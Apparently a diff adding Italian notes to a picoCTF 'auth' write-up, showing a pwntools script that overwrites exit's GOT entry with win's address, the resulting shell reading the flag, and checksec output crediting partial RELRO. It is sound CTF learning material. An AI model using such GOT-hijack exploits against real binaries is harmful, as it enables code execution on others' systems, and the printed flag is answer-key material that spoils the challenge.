@@ -1,1 +1,31 @@
-1)
+1)auth
+  Posso sovraccaricare la entry nella GOT della funzione exit (in questo caso dichiarata esplicitamente) con l'indirizzo della funzione win
+  Per fare ciò serve solamente mandare 2 linee:
+  	1)indirizzo della entry della funzione da sovraccaricare
+  	2)indirizzo della funzione target
+  	
+    Siamo in un'architettura a 32bit
+  
+    from pwn import *
+    e=ELF('./auth')
+    p=process('./auth')
+    
+    p.sendline(hex(e.got['exit']))
+    p.sendline(hex(e.symbols['win']))
+    p.interactive()
+    
+    nota: l'input richiesto da scanf è %x ossia hex
+      $ ls
+      auth    description.txt  flag.txt  peda-session-auth.txt
+      auth.c    exploit.py     makefile
+      $ cat flag.txt
+      picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_7a9e7634}
+
+------------------------------------
+=>checksec
+CANARY    : disabled
+FORTIFY   : disabled    Abbiamo potuto fare il GOT Hijacking solo perchè c'è RELRO partial
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+----------------------------------------
